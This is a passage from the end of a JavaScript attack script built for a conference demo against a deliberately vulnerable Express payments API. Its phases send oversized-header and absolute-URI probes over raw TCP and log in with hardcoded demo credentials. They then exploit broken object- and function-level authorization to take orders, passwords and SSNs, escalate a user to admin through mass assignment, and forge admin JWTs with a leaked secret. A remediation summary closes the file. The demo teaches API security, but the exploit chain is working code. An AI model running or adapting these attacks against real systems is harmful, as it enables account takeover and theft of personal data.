      label: "settings-restore",
      silent: !verbose,
    });
  }
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 15  ·  Raw socket header / framing probes (HTTP only)
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseRawHeaderAbuse
 * Transport: {@link rawHttp} (raw TCP HTTP/1.1 — not fetch)
 * Wire labels: huge-header (32 KB header), absolute-uri (absolute-form request line)
 * Skip:     entire body on HTTPS targets (banner still prints, then info + return)
 *
 * Posture notes for reverse-proxy / header-size handling — not classic app authz.
 */
async function phaseRawHeaderAbuse() {
  step("Raw socket header / framing probes (HTTP only)");
  intent("Oversized headers + absolute-form request line — posture notes for reverse proxies.");
  if (IS_TLS) {
    info("Skipped raw TCP probes against HTTPS targets");
    return;
  }
  const big = "A".repeat(32_000);
  narrate("Sending a 32 KB single header over raw TCP…");
  const r1 = await rawHttp(
    `GET /api/health HTTP/1.1\r\nHost: ${HOST}\r\nX-Flood: ${big}\r\nConnection: close\r\n\r\n`,
    3000,
    "huge-header"
  );
  if (!r1.skipped) {
    if (r1.status === 200) {
      bad("Oversized header still got HTTP 200");
      record(
        "INFO",
        "32 KB request header accepted",
        "Observed acceptance at one size, not absence of a larger limit or proof of resource exhaustion. Header parsing limits belong to the HTTP runtime/proxy.",
        { kind: "framework-gap", owasp: "API4" }
      );
    } else {
      info(`Oversized header → ${r1.status || r1.statusLine || "no status"}`);
    }
  }

  narrate("Absolute-form request line GET http://evil.example/api/users …");
  const r2 = await rawHttp(
    `GET http://evil.example/api/users HTTP/1.1\r\nHost: ${HOST}\r\nConnection: close\r\n\r\n`,
    2500,
    "absolute-uri"
  );
  if (!r2.skipped && r2.status === 200 && /users|email/i.test(r2.raw)) {
    bad("Absolute-URI request still served the users dump");
    record(
      "INFO",
      "Absolute-form request line accepted",
      "Posture note for reverse-proxy setups",
      { kind: "framework-gap" }
    );
  }
}

/** Seed accounts that exist on every cold start / isolate. */
const DEMO_CREDENTIALS = [
  { email: "alice@example.com", password: "password123" },
  { email: "bob@example.com", password: "bobsecret" },
  { email: "admin@vaultpay.demo", password: "admin123" },
];

/**
 * Auth helper (no own PHASE banner) — runs under:
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 16  ·  Login, BOLA, mass assignment, admin, JWT forge
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Used by {@link phaseAuthzAndForgery}.
 * Tries DEMO_CREDENTIALS until POST /api/auth/login returns a token.
 * Wire labels: login:<email>
 *
 * @returns {Promise<{ email: string, password: string, token: string, user: any } | null>}
 */
async function demoLogin() {
  for (const cred of DEMO_CREDENTIALS) {
    narrate(`Trying demo login ${cred.email}…`);
    const res = await http("POST", "/api/auth/login", {
      body: cred,
      label: `login:${cred.email}`,
    });
    if (res.status === 200 && res.json?.token) {
      return { ...cred, token: res.json.token, user: res.json.user };
    }
  }
  return null;
}

/**
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 *   PHASE 16  ·  Login, BOLA, mass assignment, admin, JWT forge
 * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 * Function: phaseAuthzAndForgery
 * Last phase in main() (after settings + raw TCP so forged admin JWT is the climax LOOT)
 * Helper:   {@link demoLogin}
 * Endpoints / wire labels:
 *   - login:<email>       POST /api/auth/login
 *   - bola-orders         GET /api/orders           (Bearer user JWT)
 *   - mass-assign-admin   PUT /api/users/:id        role=admin, balance=…
 *   - cross-user-write    PUT /api/users/2          (Bob hijack)
 *   - admin-stats         GET /api/admin/stats      (BFLA — authn only)
 *   - jwt-alg-none        GET /api/me               (expect reject on jsonwebtoken v9)
 *   - forged-admin-me     GET /api/me               (HS256 with stolen.jwtSecret)
 *
 * Sets stolen.token, stolen.escalated, stolen.forgedAdminToken, stolen.orders.
 */
async function phaseAuthzAndForgery() {
  step("Login, BOLA, mass assignment, admin, JWT forge");
  intent("JWT proves someone logged in. It does not decide what they may read or write.");

  const loginOk = await demoLogin();
  if (!loginOk) {
    bad("Could not login with demo credentials — skipping authz chain");
    return;
  }
  stolen.token = loginOk.token;
  stolen.loginUser = loginOk.user;
  ok(`Logged in as ${loginOk.email} (role=${loginOk.user.role})`);
  loot("token", loginOk.token);

  narrate("Fetching /api/orders with this user JWT — server should scope to self…");
  const orders = await http("GET", "/api/orders", {
    headers: { Authorization: `Bearer ${stolen.token}` },
    label: "bola-orders",
  });
  if (orders.status === 200 && Array.isArray(orders.json?.orders)) {
    stolen.orders = orders.json.orders;
    const others = new Set(
      stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
    );
    if (others.size > 0 && loginOk.user.role !== "admin") {
      bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA)`);
      for (const o of stolen.orders.slice(0, 8)) {
        loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
      }
      record(
        "CRITICAL",
        "BOLA on /api/orders",
        "Authn present, authz missing — any login reads every order",
        { kind: "app-code", owasp: "API1" }
      );
    } else if (loginOk.user.role === "admin") {
      info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA finding counted");
    } else {
      ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
    }
  }

  // Prefer seed users (Alice #1, Bob #2): they exist on every serverless isolate.
  // Register+mutate is flaky when in-memory DB is not shared across Vercel instances.
  const escToken = stolen.token;
  const escId = loginOk.user.id;

  if (loginOk.user.role !== "admin") {
    narrate("Hit /api/admin/stats before escalation with a non-admin identity...");
    const stats = await http("GET", "/api/admin/stats", {
      headers: { Authorization: `Bearer ${escToken}` },
      label: "admin-stats",
    });
    if (stats.status === 200 && Array.isArray(stats.json?.accounts) && stats.json.accounts.length > 0) {
      bad(`Admin dashboard open to a non-admin identity - ${stats.json.accounts.length} accounts`);
      for (const account of stats.json.accounts.slice(0, 6)) {
        loot(account.email, `password=${account.password} ssn=${account.ssn}`);
      }
      record(
        "CRITICAL",
        "Admin route accessible to a non-admin identity",
        "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA).",
        { kind: "app-code", owasp: "API5" }
      );
    } else {
      info(`Non-admin access probe returned ${stats.status}; BFLA not confirmed`);
    }
  } else {
    info("Login fallback is already admin; skip non-admin BFLA and privilege-escalation claims");
  }

  const victimId = escId === 2 ? 1 : 2;
  const victimName = victimId === 2 ? "Bob" : "Alice";
  narrate(`Cross-user write: ${loginOk.email}'s token edits seed user #${victimId} (${victimName})…`);
  const hijack = await http("PUT", `/api/users/${victimId}`, {
    headers: { Authorization: `Bearer ${escToken}` },
    body: {
      internalNote: "cleared by attacker via cross-user PUT",
      name: `Hijacked ${victimName}`,
    },
    label: "cross-user-write",
  });
  if (loginOk.user.role !== "admin" && hijack.status === 200 &&
    hijack.json?.user?.id === victimId && hijack.json.user.name === `Hijacked ${victimName}`) {
    bad(`Rewrote user #${victimId} without ownership check`);
    loot("victim", JSON.stringify(hijack.json.user));
    record(
      "CRITICAL",
      "Cross-user write without ownership check",
      "Before escalation, a regular user's token edited a different seed user's record without an ownership check.",
      { kind: "app-code", owasp: "API1" }
    );
  } else {
    info(`Cross-user write → ${hijack.status}`);
  }

  narrate(`Mass-assign role=admin and balance on seed user #${escId} (${loginOk.email})...`);
  const escalate = await http("PUT", `/api/users/${escId}`, {
    headers: { Authorization: `Bearer ${escToken}` },
    body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
    label: "mass-assign-admin",
  });
  if (loginOk.user.role !== "admin" && escalate.status === 200 && escalate.json?.user?.id === escId &&
    escalate.json.user.role === "admin" && escalate.json.user.balance === 1_000_000) {
    stolen.escalated = loginOk.user.role !== "admin";
    bad(`User #${escId} has role=admin and balance=${escalate.json.user.balance}`);
    loot("new-role", escalate.json.user.role);
    loot("new-balance", String(escalate.json.user.balance));
    record(
      "CRITICAL",
      "Mass assignment privilege escalation",
      "No field allowlist on PUT body - app merged raw JSON into the user",
      { kind: "app-code", owasp: "API3" }
    );
  } else {
    info(`Mass assignment → ${escalate.status}`);
  }

  // One probe we EXPECT to fail. jsonwebtoken v9 defaults to an HS* allowlist
  // for string secrets, so `alg: none` is rejected without the app configuring
  // anything. Worth showing: the save came from a library maintainer's breaking
  // change, not from the developer knowing to ask for it.
  narrate('Trying the classic "alg": "none" unsigned-token forgery…');
  const noneToken = `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64url(
    JSON.stringify({ sub: 3, email: "admin@vaultpay.demo", role: "admin", name: "None Admin" })
  )}.`;
  const noneRes = await http("GET", "/api/me", {
    headers: { Authorization: `Bearer ${noneToken}` },
    label: "jwt-alg-none",
  });
  if (noneRes.status === 200 && noneRes.json?.user?.id === 3) {
    bad("Server accepted an UNSIGNED alg:none token");
    record(
      "CRITICAL",
      "Unsigned JWT (alg:none) accepted",
      "Verification did not pin an algorithm allowlist",
      { kind: "app-code", owasp: "API2" }
    );
  } else if (noneRes.status === 401) {
    ok(
      `alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`
    );
    info("You did not configure this. A library maintainer did. That is the whole talk.");
  } else {
    info(`Unsigned-token probe inconclusive (${noneRes.status}); signature rejection not confirmed`);
  }

  if (stolen.jwtSecret) {
    narrate(`Forging HS256 admin JWT with leaked secret "${stolen.jwtSecret}"…`);
    const admin =
      stolen.users.find((u) => u.role === "admin") || {
        id: 3,
        email: "admin@vaultpay.demo",
      };
    const forged = signHs256(
      {
        sub: admin.id,
        email: admin.email,
        role: "admin",
        name: "Forged Admin",
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 86400,
      },
      stolen.jwtSecret
    );
    loot("forged-jwt", forged);
    const me = await http("GET", "/api/me", {
      headers: { Authorization: `Bearer ${forged}` },
      label: "forged-admin-me",
    });
    if (me.status === 200 && me.json?.user?.id === admin.id && me.json.user.role === "admin") {
      stolen.forgedAdminToken = forged;
      bad("Server accepted a fully attacker-forged admin JWT");
      loot("forged-identity", JSON.stringify(me.json?.user));
      record(
        "CRITICAL",
        "Forged JWTs accepted (weak/leaked secret)",
        "A forged token returned the intended admin identity. Signature verification is expected to accept correctly signed tokens; disclosure/weakness of the key is the authentication compromise.",
        { kind: "app-code", owasp: "API2" }
      );
    } else {
      info(`Forged admin identity not confirmed (${me.status}); generated token is not counted as accepted`);
    }
  } else {
    info("No JWT secret recovered — skip forgery");
  }
}

/**
 * ╔══════════════════════════════════════════════════════════════════════╗
 * ║                        ENGAGEMENT REPORT                             ║
 * ╚══════════════════════════════════════════════════════════════════════╝
 * (Not a PHASE banner — end of main(), after every phase*)
 * Function: printReport
 *
 * Scoreboard + all findings + DEMO RESULT line + remediation footer.
 * With --json, also prints a machine-readable findings object.
 *
 * Remediation is printed once at the end (not per phase) so --drama stays
 * LOOT-focused; the footer is what the room screenshots after "PWNED".
 * Every bullet maps to at least one finding this script actually raises —
 * keep them in sync when adding a phase.
 */
function printRemediation() {
  console.log(`
${c.bold}${c.green}╔══════════════════════════════════════════════════════════════════════╗
║                     REMEDIATION (quick fix map)                      ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
  console.log(
    `  ${c.dim}One block at the end — not during LOOT. Fix by kind tag on each finding.${c.reset}\n`
  );

  console.log(`  ${c.red}${c.bold}(app-code)${c.reset}  — fix in your handlers (framework will not invent these)
    · Ownership (BOLA/IDOR): order.userId === req.user.sub — on every read AND write
    · Roles (BFLA): requireRole("admin") — login alone is not enough
    · Request field allowlist — never merge raw JSON into user/role (kills mass
      assignment and __proto__ pollution in one move)
    · Response field allowlist — pick what you return; no ssn / cardNumber /
      password leaving a list or search endpoint
    · Path jail on any file path from user input
      ${c.dim}path.resolve(root, name) must stay under root; or allowlist names only${c.reset}
    · SSRF: allowlist egress hosts; reject link-local/metadata (169.254.169.254)
      and anything that is not http(s)
    · Output encoding: never send user input as text/html — return JSON, or escape
    · Open redirect: relative paths only; no public debug route returning secrets;
      generic login errors ("invalid credentials", not "no account for that email")
    · Authn ≠ authz: a valid JWT is not an access-control policy\n`);

  console.log(`  ${c.yellow}${c.bold}(misconfig)${c.reset} — stop weakening safer defaults you already had
    · Body: prefer express.json() default 100kb; raise only per-route if needed
    · Stacks: don't hand-roll an error handler that returns err.stack — Express's
      finalhandler already omits it when NODE_ENV=production
    · CORS: use an origin policy appropriate to the data. Wildcards allow
      non-credentialed reads, not victim cookie-session response access\n`);

  console.log(`  ${c.blue}${c.bold}(framework-gap)${c.reset} — Express does not ship these; you must add them
    · Rate limit / login throttle (e.g. express-rate-limit)
    · Secure headers (helmet or equivalent)
    · App-level request timeout (not only Node's long socket defaults)
    · Or use a stack that fails closed on body/headers/timeout/SSRF by default\n`);

  console.log(`  ${c.bold}Tiny code shapes (illustrative):${c.reset}
    ${c.dim}// ownership
    if (order.userId !== req.user.sub) return res.status(403).json({ error: "forbidden" });
    // path jail
    const abs = path.resolve(PUBLIC, name);
    if (!abs.startsWith(PUBLIC + path.sep)) return res.sendStatus(404);
    // field allowlist
    const { name, theme } = req.body; // never ...req.body onto user.role${c.reset}\n`);

  console.log(
    `  ${c.yellow}Remember:${c.reset} defaults and middleware shrink footguns;` +
    ` ownership and path jails are still your code.`
  );
  console.log(
    `  ${c.dim}Deeper notes: README.md · TALK.md · CLOUDFLARE-VS-APP-SECURITY.md · TEARDOWN.md${c.reset}`
  );
}

function printReport() {
  const bySev = stolen.findings.reduce((m, f) => {
    m[f.severity] = (m[f.severity] || 0) + 1;
    return m;
  }, {});
  const byKind = stolen.findings.reduce((m, f) => {
    const k = f.kind || "app-code";
    m[k] = (m[k] || 0) + 1;
    return m;
  }, {});
  const criticals = bySev.CRITICAL || 0;
  const owaspHits = [
    ...new Set(stolen.findings.map((f) => f.owasp).filter(Boolean)),
  ].sort();

  console.log(`
${c.bold}${c.red}╔══════════════════════════════════════════════════════════════════════╗
║                        ENGAGEMENT REPORT                             ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
  const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
  console.log(`  ${c.bold}Target${c.reset}          ${BASE}`);
  console.log(`  ${c.bold}HTTP requests${c.reset}   ${reqSeq}`);
  console.log(`  ${c.bold}Elapsed${c.reset}         ${elapsedSec}s`);
  console.log(`  ${c.bold}Finding records${c.reset} ${stolen.findings.length} (cumulative, not unique root causes)`);
  console.log("  Severity: demo author ratings, not OWASP scores or CVSS. API tags map to the 2023 edition; CWE tags identify specific weaknesses.");
  console.log(`  ${c.bold}By severity${c.reset}     ${JSON.stringify(bySev)}`);
  console.log(`  ${c.bold}By kind${c.reset}         ${JSON.stringify(byKind)}`);
  console.log(
    `  ${c.bold}OWASP API 2023${c.reset}   ${owaspHits.length ? owaspHits.join(", ") : "—"}`
  );
  console.log(`  ${c.bold}Users stolen${c.reset}     ${stolen.users.length}`);
  console.log(`  ${c.bold}Orders stolen${c.reset}    ${stolen.orders.length}`);
  console.log(
    `  ${c.bold}JWT secret${c.reset}       ${stolen.jwtSecret ? c.red + "YES — " + stolen.jwtSecret + c.reset : "no"}`
  );
  console.log(`  ${c.bold}Privilege esc${c.reset}    ${stolen.escalated ? c.red + "YES" + c.reset : "no"}`);
  console.log(
    `  ${c.bold}Forged admin${c.reset}     ${stolen.forgedAdminToken ? c.red + "YES" + c.reset : "no"}`
  );

  console.log(`\n  ${c.bold}What the team believed:${c.reset}`);
  console.log(`    ${c.green}"We use Express 5 + JWT. Deployed to the cloud. We're secured."${c.reset}`);
  console.log(`\n  ${c.bold}What the console just proved:${c.reset}`);
  console.log(
    `    ${c.red}Review the recorded response evidence above; inconclusive probes are not confirmed exploits.` +
    ` Authn ≠ authz. Edge WAF ≠ API authorization.${c.reset}`
  );
  console.log(
    `    ${c.yellow}Framework and library defaults help; application authorization, data minimization, and destination policies remain explicit responsibilities.${c.reset}`
  );
  console.log(
    `    ${c.dim}kind legend: framework-gap = Express has no control;` +
    ` misconfig = demo app/env weakened a safer default (not the cloud platform);` +
    ` app-code = vulnerable route / app logic you wrote.${c.reset}`
  );

  const misconfigs = stolen.findings.filter((f) => f.kind === "misconfig");
  const gaps = stolen.findings.filter((f) => f.kind === "framework-gap");
  const appHoles = stolen.findings.filter((f) => (f.kind || "app-code") === "app-code");

  console.log(`\n  ${c.bold}Whose fault? (read the kind tag on every finding):${c.reset}`);
  console.log(
    `    ${c.yellow}(misconfig)     ${c.reset}${misconfigs.length} — this demo's app/deploy vars (CORS *, BODY_LIMIT ~50mb, stack leak).` +
    ` Not Express defaults. Not Cloudflare/Vercel inventing them.`
  );
  console.log(
    `    ${c.blue}(framework-gap) ${c.reset}${gaps.length} — Express does not ship the control (headers, rate limit, timeout, …).`
  );
  console.log(
    `    ${c.red}(app-code)      ${c.reset}${appHoles.length} — vulnerable routes you wrote (BOLA, proxy, traversal, debug, …).`
  );
  console.log(
    `    ${c.yellow}◇ PLATFORM     ${c.reset}${stolen.platformNotes.length} — edge/runtime blocked a probe; does not mean the API is authorized.`
  );
  if (misconfigs.length) {
    console.log(`\n  ${c.bold}Misconfig detail (cloud hosts still show these — same app.js):${c.reset}`);
    for (const f of misconfigs) {
      finding(f.severity, f.title, f);
      if (f.detail) info(f.detail);
    }
  }

  if (stolen.platformNotes.length) {
    console.log(`\n  ${c.bold}${c.yellow}Platform notes (edge blocked probe — app may still be open):${c.reset}`);
    for (const n of stolen.platformNotes) {
      console.log(`    ${c.yellow}◇${c.reset} ${n.title}`);
      if (n.detail) info(n.detail);
    }
  }

  console.log(`\n  ${c.bold}All findings:${c.reset}`);
  for (const f of stolen.findings) {
    finding(f.severity, f.title, f);
    if (f.detail) info(f.detail);
  }

  console.log(`
  ${c.bold}What Express actually fails to give you by default:${c.reset}
    · No Helmet-style secure headers on routes (x-powered-by stays ON)
    · No rate limiting / login throttle
    · No app-level request timeout middleware
    · No authz primitive (requireAuth ≠ requireRole)
    · No response schema / field allowlist
    · No SSRF / open-redirect helpers (res.redirect does not validate URLs)
    (Where Express *does* have a safer default when you use it — e.g. express.json
     limit '100kb'→413; finalhandler omits stacks when NODE_ENV=production —
     this demo sometimes replaces them on purpose. Those findings are misconfig,
     not framework-gap, and not the cloud platform. Sources: expressjs.com body-parser
     docs, security guide, express/lib/application.js, pillarjs/finalhandler.)

  ${c.dim}See CLOUDFLARE-VS-APP-SECURITY.md (section "Whose fault?") for edge-vs-app-vs-misconfig.
  Only attack systems you own. Educational VaultPay demo only.
  Tear down or gate public deploys after the talk (TEARDOWN.md).${c.reset}
`);

  // Stage order: findings → PWNED banner → homework (screenshot-friendly).
  if (criticals > 0) {
    console.log(
      `${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
    );
  } else {
    console.log(
      `${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical · ${reqSeq} requests · ${elapsedSec}s (unexpected for this demo)  ${c.reset}\n`
    );
  }

  printRemediation();

  if (asJson) {
    console.log(
      JSON.stringify(
        {
          target: BASE,
          owaspEdition: 2023,
          severityScheme: "demo-author-rated",
          counting: "finding-records-not-unique-root-causes",
          requests: reqSeq,
          elapsedSeconds: Number(elapsedSec),
          findings: stolen.findings,
          platformNotes: stolen.platformNotes,
          usersStolen: stolen.users.length,
          ordersStolen: stolen.orders.length,
          jwtSecret: Boolean(stolen.jwtSecret),
          escalated: stolen.escalated,
          forgedAdmin: Boolean(stolen.forgedAdminToken),
        },
        null,
        2
      )
    );
  }
}

/**
 * Orchestrator — call order of every demo phase.
 *
 * Console flow: banner → PHASE 01…N (see PHASE MAP) → ENGAGEMENT REPORT.
 * Between phases: {@link dramaPause} if --drama (Enter to continue).
 *
 * Order (stable; search function names when a log title is unclear):
 *   1. phaseReset                 (--reset only; else no banner)
 *   2. phaseRecon
 *   3. phaseMissingSecurityHeaders
 *   4. phaseCorsMisconfig
 *   5. phaseBodyLimit
 *   6. phaseNoRateLimitFlood      (--skip-flood short-circuits body)
 *   7. phasePathTraversal
 *   8. phaseOpenRedirect
 *   9. phaseSsrfProxy             (+ probeMetadataEgress, probeInternalPivot)
 *  10. phaseStackAndEcho
 *  11. phaseSlowTimeout           (--skip-slow short-circuits body)
 *  12. phaseUnauthDataTheft
 *  13. phaseAccountEnumeration
 *  14. phaseSettingsMerge
 *  15. phaseRawHeaderAbuse        (HTTP only; HTTPS short-circuits body)
 *  16. phaseAuthzAndForgery       (climax: BOLA / mass-assign / forged JWT)
 *  ——  printReport
 */
async function main() {
  banner();
  await phaseReset();
  await dramaPause();
  await phaseRecon();
  await dramaPause();
  await phaseMissingSecurityHeaders();
  await dramaPause();
  await phaseCorsMisconfig();
  await dramaPause();
  await phaseBodyLimit();
  await dramaPause();
  await phaseNoRateLimitFlood();
  await dramaPause();
  await phasePathTraversal();
  await dramaPause();
  await phaseOpenRedirect();
  await dramaPause();
  await phaseSsrfProxy();
  await dramaPause();
  await phaseStackAndEcho();
  await dramaPause();
  await phaseSlowTimeout();
  await dramaPause();
  await phaseUnauthDataTheft();
  await dramaPause();
  await phaseAccountEnumeration();
  await dramaPause();
  // Settings + raw TCP before the climax so the forged admin JWT is the last LOOT.
  await phaseSettingsMerge();
  await dramaPause();
  await phaseRawHeaderAbuse();
  await dramaPause();
  await phaseAuthzAndForgery();
  printReport();
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
